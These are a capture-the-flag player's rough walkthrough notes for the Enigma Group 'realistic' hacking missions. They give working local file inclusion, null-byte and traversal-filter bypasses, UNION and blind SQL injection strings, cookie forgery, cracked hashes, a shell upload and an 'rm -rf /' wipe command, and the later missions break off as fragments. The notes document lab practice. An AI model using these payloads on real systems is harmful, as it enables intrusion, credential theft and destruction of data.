@@ -1,0 +1,405 @@
+REALISTIC 1:
+(EASTER EGG 5: http://www.enigmagroup.org/missions/realistics/1/fuckinsweet/anothereasteregg.php)
+
+view source to reveal hidden text box and set it to true before submitting it to get points!
+
+	check the portscan list (important part of this mission)
+	IP: 85.17.239.186
+
+	22/tcp 	– open	ssh
+	52/tcp 	– open 	domain
+	80/tcp 	– closed	http
+110/tcp 	–closed	pop3
+443/tcp 	– open 	https
+1337/tcp 	– open	waste
+4444/tcp 	– closed	krb524
+8080/tcp 	– open	http-proxy
+
+notice the port number 1337… ahh! Let’s try putting this in the url
+
+http://85.17.239.186:1337
+
+now that it’s a backdoor login to the webserver.. let’s find the password! Go back to the site and do some snooping around…
+
+	notice the /defacements/ full of screenshots - - interesting!
+Also, notice the page is a LFI → let’s find the passwd file. Enter this in the url:
+http://www.enigmagroup.org/missions/realistics/1/?page=../../../../etc/passwd
+
+and get this list:
+
+root:4d1Yq6PXGzYm6:0:0:root:/root:/bin/bash
+psychomarine:4doxGUy8UpD0o:500:500:psychomarine:/home/psychomarine:/bin/bash
+mets0c30:4d.0gmeqJKnns:501:501:mets0c30:/home/mets0c30:/bin/bash
+xero:4daaaoH4HRORM:502:502:xero:/home/xero:/bin/bash
+cereal:4dhDNV4QowNPc:503:503:cereal:/home/cereal:/bin/bash
+ausome1:4dNl9DNd9LXJw:504:504:ausome1:/home/ausome1:/bin/bash
+ratboy:4dtpZl8gaHF86:505:505:ratboy:/home/ratboy:/bin/bash
+
+	crack passwords which is:
+root:4d1Yq6PXGzYm6 			------ 31337	
+psychomarine:4doxGUy8UpD0o 	------ n00bs
+mets0c30:4d.0gmeqJKnns 		------ h4x0r
+xero:4daaaoH4HRORM 		------ nothing
+cereal:4dhDNV4QowNPc 		------ killer
+ausome1:4dNl9DNd9LXJw 		------ immain
+ratboy:4dtpZl8gaHF86			------ phpguru
+
+log in the webserver as root then click on this linkhttp://www.enigmagroup.org/missions/realistics/1/d2h5dGhlZnVja2RpZHlvdWRlY29kZXRoaXM=.php
+
+I tried to decode the base64 and it says : whythefuckdidyoudecodethis
+Log in as psychomarine – nothing..
+Log in as mets0c30 get this http://www.enigmagr
+Log in as xero, you get this oup.org/miss
+Log in as cereal you get this ions/realist
+Log in as ausome1 you get this  ics/1/fuckinsweet/an
+Log in as ratboy you get this othereasteregg.php
+	
+REALISTIC 2:
+check robots.txt  first and you will see the interesting links here:
+/pages/ and /admin/
+ok now when we do this http://www.enigmagroup.org/missions/realistics/2/index.php?page=%27  it throws an error when entering the ‘ in the URL
+	
+ 	we found that the site has LFI – let’s find the admin.php by doing this in the url: index.php?page=../admin/index.php   whoops. The script adds .txt on the end. Ok lets inject null byte by doing this: index.php?page=../admin/index.php%00
+	
+	now we can see the code in index.php
+	<?php
+/**
+ * @version $id: xedni.php, v.1.0, 2007/11/05 $
+ * @package Realistic:2
+ */
+
+// require the mission include
+require_once('mission_data/mission.inc.php');
+
+/** Are they logged in? **/
+if ($_COOKIE["admin"] == "Brain-Tek Administrator:4fe56cc1316aa2c0291bba957df0513e")
+{
+    $action = htmlentities($_GET['action']);
+    if ($action == "add")
+    {
+        include("add.php");
+    }
+    elseif ($action == "del")
+    {
+        include("del.php");
+    }
+    elseif ($action == "log")
+    {
+        include("log.php");
+    }
+    else
+    {
+        echo '
+        <br><br>
+        <table align="center">
+        <tr><td>Add News</td><td><a href="?action=add">[ADD]</a></td></tr>
+        <tr><td>Delete News</td><td><a href="?action=del">[DEL]</a></td></tr>
+        <tr><td>Logout</td><td><a href="?action=log">[LOG]</a></td></tr>
+        </table>
+        <br><br>';
+    }
+}
+/** Are they logging in? **/
+elseif (isset($_POST["submit"]))
+{
+    $uname = htmlentities($_POST["uname"]);
+    $pword = md5(md5($_POST["pword"]));
+    if ($user == $uname && $pass == $pword)
+    {
+        setcookie("admin", $uname.":".$pword, time()+36000);
+        echo '
+        <br /><br />
+        <table align="center">
+        <tr><td>Add News</td><td><a href="add.php">[ADD]</a></td></tr>
+        <tr><td>Delete News</td><td><a href="del.php">[DEL]</a></td></tr>
+        <tr><td>Logout</td><td><a href="log.php">[LOG]</a></td></tr>
+        </table>
+        <br /><br />';
+    }
+    else
+    {
+        die('Login Failure!');
+    }
+}
+
+/** No? Let them log in **/
+else
+{
+    echo '<table align="center" height="100%">';
+    echo '<tr><td valign="middle">';
+    echo '<form action="" method="POST">';
+    echo '<b>Username</b>: <input type="text" name="uname" /><br />';
+    echo '<b>Password</b>: &nbsp;<input type="password" name="pword" /><br />';
+    echo '<input type="submit" name="submit" value="Login" />';
+    echo '</td></tr>';
+    echo '</table>';
+}
+?>
+
+	okay now, this code has given you everything you need to hack.
+First:
+	Set the cookie to admin=Brain-Tek Administrator:4fe56cc1316aa2c0291bba957df0513e
+	Then go to /admin/index.php page and you will see that you are already logged in as admin.
+
+	4fe56cc1316aa2c0291bba957df0513e is a md5x2 and pw is: crime
+
+	back to the admin page – when you try to add news. You get this error:
+An error occurred when trying to submit your news entry into tbl_news1 in the database hst_braintek.
+	Seems that the site is using MySQL and wants us to perform sql injection. So there must be config.php for that, let’s try it out:
+
+Index.php?page=../admin/config.php%00
+
+<?php
+/**
+ * @version $id: config.php, v.1.0, 2007/11/05 $
+ * @package Realistic:2
+ */
+
+// require the mission include
+require_once('mission_data/mission.inc.php');
+
+$sitename = "Brain-Tek Corporation";
+$slogan = "Preventing Thought Crime, One Brain at a Time";
+$administrator = 1;
+$user = "Brain-Tek Administrator";
+$pass = "4fe56cc1316aa2c0291bba957df0513e";
+$db_host = "localhost";
+$db_user = "sql";
+$db_pass = "sql889110";
+$db_name = "brain-tek";
+?>
+
+	in the admin when you click on ADD.php – notice the error message saying about the info being moved to /news/ directory.. let’s look in that folder! 
+Download the rar file :  TechnoCop.rar 
+
+We need to crack the rar file: I guessed it easily it is brain
+
+Now, read the :readme.txt: to find the purchase code in the message which is:
+1JH-8DQ-B6X-P1D
+
+also check for the logs. The typical place to be is /logs/ or /log/ but this time we found the logs in this place: /admin/logs/ then we have this file accesslog.txt
+
+	use the admin page to delete the news ( use firebug to change the hidden field “news” to “logs” then delete it.
+	
+
+	Realistic 3:
+
+index.php?page=browse&file=browse.php to look at the file. Notice there is a exploit in the str_replace. We can use this ...//  to bypass the filter! Because with the ../ being replaced with ‘’ so we can use ….// to turn into ..// by removing the middle ../ and the first .. and last / will become concated into ../ thus, bypassing the filter.
+$file = str_replace('../', '', $_GET[file]);
+	
+		change the url to this: index.php?page=browse&file=admin.php
+		you will get an error saying: File not found: ./site-content/uploads/admin.php
+		ah! Lets check out the folder /site-content/uploads/
+		nothing. But you know know how many directory to go back.. lets go back two 
+injection: index.php?page=browse&file=....//....//index.php
+and index.php?page=browse&file=....//....//site-content/news.php
+
+		SQL INJECTION DETECTION IN THE ID!
+•  •  	$mysql->connect();
+•  	$mysql->query("SELECT date, title, news, postedby FROM tbl_news WHERE id=" . $_GET['newsId'], true);
+•  	$mysql->close();
+
+		
+		perform BLIND sql injection by testing columns. We know there is 4 but we test anyways. Enter 1,2,3 – we get error, test 1,2,3,4 no error, test 1,2,3,4,5 – get error so we know exactly for sure there is 4 columns.
+
+index.php?page=news&newsId=1 UNION ALL SELECT 1,2,3,4 FROM tbl_users--
+add WHERE id=1-- and there are total of 4 users, the id=2 is the SCH-admin username that we need to login as.
+Ok we know that the id for the admin is 2, put this injection:
+
+index.php?page=news&newsId=4 UNION ALL SELECT id,user,passhash,4 FROM tbl_users WHERE id=2—
+
+you will see the data showing as 
+
+id=1 – dummy_user ,  -- fake placement --
+id=2 -- sch-admin, 091ac288e173243b2f5de0bcf1690218
+id=3 – moderator, 277b4196c5aae1e55157c9c190d8aaa4
+id=4 – killerguppy101, 3e83b7b25abec17bc99a7840a2201806
+
+use php code to crack the md5 algorithm with 2 specific salts 
+	
+		the administration was found and was spelled adminstor so the url:
+index.php?page=browse&file=....//....//adminator/index.php
+
+fially we got the login code:
+
+$user = addslashes(htmlentities(stripslashes($_POST[admin])));
+$pass = addslashes(htmlentities(stripslashes($_POST[hash])));
+$pass = md5(base64_encode("FirstSalt".md5($pass)."SecondSalt"));
+$sql = sprintf("SELECT count(*) FROM tbl_users WHERE user=('%s') AND passhash=('%s') AND isAdmin = 1", $user, $pass);
+
+	
+
+using the code, we cracked two passwords
+sch-admin == effortless
+	moderator == mod
+	
+	
+log in as sch-admin 
+you will see that there is 4 email to be read, just select the one that talks about code for money, forward that.   Then go to files. And in the URL. Replace the file=browse.php to a log file. You can see the logs by accessing /logified/ to find how the logs are modified.  
+
+Then do this in the url:
+/adminator/index.php?action=Delete+this+file&file=....//logified/09-11-13.txt&page=delete
+
+and beat it!
+	
+Realistic 4:
+We know this page gives you the possibility to log in as anyone because the site uses cookies to track username and sessionid! – let’s register as someone.
+	index.php?page=register  now you are  logged in. let’s view this page:
+index.php?page=submit to submit website address with username next to it and you are able to click on the username to view the profile of that user!
+When you are looking at the profile of your own user but cannot see admin’s profile. But in your profile you can see names of user who can view your profile. That’s a big give away!  ( username of admins:  JulianaTheory and ZedX)
+Now look in your cookies! Ah you see your cookie enabled with two cookies: Usr and SessId
+
+Edit your cookie Usr=JulianaTheory then view that profile, you will be able to view Juliana’s data: use the sessid to edit your cookie to make her log in as Juliana and administration link will appear.
+
+sessid: a53201d5839970946e73d8aac21f8877
+IP: 66.172.230.78
+
+When you are logged in as Juliana you will see link to admin (.htaccess) page which is located in this folder /sekretadminar3a/
+
+	Brute force the .htpasswd to login….  password is: pi
+Now that you are logged in as ZedX and you now can see userDB by going to /sekretadminar3a/index.php?config=userDB
+
+The password list are as follows:
+ZedX      			604288c079d95a3f3fcae36867ff825c
+JulianaTheory      	4461089e4527a9c95308ec53c60e3937
+r0fl3r      			18e71b9a9f3402a7b329bf4f3e13d917
+UnBorn89      		a09ed53e67d20eadc4318347d50cd4f8
+Lead      			a41a32821ab5ed9c8f505d927e9919a4 
+FireWire      		09e4de2912d27c9e95e28ef8fa999a5e
+Chumploo     		ab05ced794c02805f305c148ea7d3336
+QueenRoot3rHRTSu     66194fb61d912c8e611e38aa4fc3fd6d  
+
+	Crack the hashes using MD5:
+ZedX      			easyas
+JulianaTheory      	
+r0fl3r      			
+UnBorn89      		
+Lead      			 
+FireWire      		
+Chumploo     		
+QueenRoot3rHRTSu 	 
+
+After cracking Zed’s hash, log in as him, you can view his profile to reveal his sessionID which is: a31e05f831a1eee315ed2970da4e9e6c
+
+	Now go to admin and you can see the insecureshell link to appear.
+	/sekretadminar3a/index.php?config=secretshell
+
+you are logged in the shell, notice no commands are working but the goal of this mission is to wipe out the site – command to delete a directory:
+rm -rf /
+		and you win!	Note: sekretadminar3a/complete.php?i=AsDf
+
+REALISTIC 5:
+Check out robots.txt to reveal 3 hidden folders /css/ /images/ /login/
+
+View the source of the index file and found this hidden folder
+/gallery/
+
+now we are getting somewhere!
+After browsing thru the images, on the 2nd page, we found this:
+<!-- Image Code --> 					<img src="../images/gallery/picture1.jpg" width="500" height="223" alt="Broken Image" />
+
+ok then I tested the injection:
+gallery/?image='
+and got the SQL error: so I used the injection:
+
+/gallery/?image=2 UNION ALL SELECT 1,2 FROM tbl_users--
+
+now I get error message saying injection is blocked by mod_security
+ok, I changed the table name to tbl_images, now I get a FPD error!
+
+Unable to execute query string due to the following errors:
+Table 'real_5_db.tbl_images' doesn't exist
+
+Now we found out database name is real_5_db 
+Try a different injection using this info!
+
+
+Any injection with “table” or “users” will be blocked by mod security and I was hinted to use procedure analyse, ok new injection:
+
+/gallery/?image=-1 UNION SELECT 1,2 FROM images PROCEDURE ANALYSE(10, 2000)—
+
+Unable to execute query string due to the following errors:
+Incorrect usage of PROCEDURE and subquery
+
+/gallery/?image=-1 OR 5=5— using any numbers. Will cause the page to load true with default picture.
+/gallery/?image=-1 OR 5=1—causes the page to be showing invalid picture meaning it loaded false.
+
+The injection works.. we need to find the right query.
+/gallery/?image=-1 OR 5=5 GROUP BY 1--   the page loads with default picture.. ok lets add the numer to 2, 3 and bingo the error throws at 3
+
+
+Unable to execute query string due to the following errors:
+Unknown column '3' in 'group statement'
+We know that there are only 2 columns in this image db.
+Lets find those two colums!
+
+How?
+
+
+- there is 2nd login and is SQLI
+
+/5/login/
+We see that there is a login!  If you access the process.php directly, you get this message : Sorry, but you have an incorrect referrer.
+-	referrer is needed
+
+-	-jpeg image has odt file (open office file)  (out of all gif, jpeg stands out)
+-pw to the file is somewhere on site hidden in a message plaintext.
+- logs?
+Hash information spoiler alert => charset [a-z 0-9] length 7 <=
+Abrabacaza ?
+
+
+	6:
+
+	look in robots.txt to reveal /cms_admin/
+	and notice the footer. It says created by diabolic. So let’s find that folder 
+
+/diabolic/  and it leds us to /diabolic/diabolic.php
+
+http://localhost/security/diabolicsecurity.php
+
+ The DIABOLIC default ports: 
+ftp	 	21/tcp	 	# File Transfer [Control] (DIABOLIC: FTP Default Port)
+smtp	 	25/tcp	 	# Simple Mail Transfer (DIABOLIC: SMTP Default Port)
+http	 	80/tcp	 	# World Wide Web HTTP (DIABOLIC: Apache Default Port)
+pop3	 	110/tcp	 	# Post Office Protocol - Version 3 (DIABOLIC: POP3 Default Port)
+imap	 	143/tcp	 	# Internet Message Access Protocol (DIABOLIC: IMAP Default Port)
+https	 	443/tcp	 	# http protocol over TLS/SSL (DIABOLIC: Apache SSL Port)
+mysql	 	3306/tcp	 	# MySQL (DIABOLIC: MySQL Default Port)
+AJP/1.3	 	8009	 	# AJP/1.3 (DIABOLIC: Tomcat AJP/1.3 Port)
+http-alt	 	8080/tcp	 	# HTTP Alternate (see port 80) (DIABOLIC: Tomcat Default Port)
+
+	
+Also go to egumyadmin.php and select ua_db to open the databse then open ua_members
+ua_id		ua_user	ua_pass
+1	Mephisto	c5d7f7061fb35c6b1f2d4d7f39352206
+2	Tyrael	f141bb5d0a12048297d7753d60f31f7a
+3	test_mod	404d8a8814a8f31774161ec9285b6be8
+4	test_dev	71d957440e8e0b08087f41c977690791
+5	test_user	6896fedb79f65b3dd7999a1ef8634d40
+	
+crack the hashes:
+
+	Mephisto:	
+2d8336401777a1465fb168bf2743c138f
+4eea83977c5ad0986465c40bb2551932
+d8336401777a1465fb168bf2743c138
+Tyrael	
+2d8336401777a1465fb168bf2743c138f
+db4c7872023307d9d3e41d7480f4db62
+d8336401777a1465fb168bf2743c138
+test_mod	m0dth1$
+test_dev	d3vth1$
+test_user	test0r123
+
+logged in as test_user – notice the UASESSID in the cookie!
+
+ 
+
+7:
+
+	/uploads/
+	name the shell – shell.php
+
+	do create username hack (sql tunication)
+-	bypass alphanumberic account. Force to make admin.
